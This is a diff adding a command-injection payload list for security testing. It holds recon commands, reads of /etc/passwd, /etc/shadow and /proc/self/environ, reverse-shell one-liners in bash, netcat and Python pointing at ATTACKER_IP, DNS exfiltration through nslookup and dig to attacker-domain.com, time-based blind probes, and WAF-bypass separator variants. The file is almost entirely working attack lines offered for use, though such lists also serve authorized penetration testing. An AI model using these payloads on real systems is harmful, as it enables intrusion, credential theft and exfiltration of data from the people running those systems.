@@ -1,0 +1,47 @@
+# Custom capability checks for command injection testing
+# Add your own payloads here
+
+# Basic system commands
+id
+whoami
+uname -a
+pwd
+ls -la
+cat /etc/passwd
+cat /etc/shadow
+ps aux
+netstat -an
+ifconfig
+ip addr
+
+# File read attempts
+/etc/hosts
+/etc/passwd
+/etc/shadow
+/proc/self/environ
+/proc/version
+/proc/cmdline
+
+# Reverse shell attempts (adjust IP/PORT)
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+nc -e /bin/bash ATTACKER_IP PORT
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# Time-based blind payloads
+sleep 5
+ping -c 5 127.0.0.1
+
+# DNS exfiltration
+nslookup $(whoami).attacker-domain.com
+dig $(hostname).attacker-domain.com
+
+# WAF bypass variations
+id;
+id |
+id ||
+id &&
+`id`
+$(id)
+{id}
+id%0a
+id%00
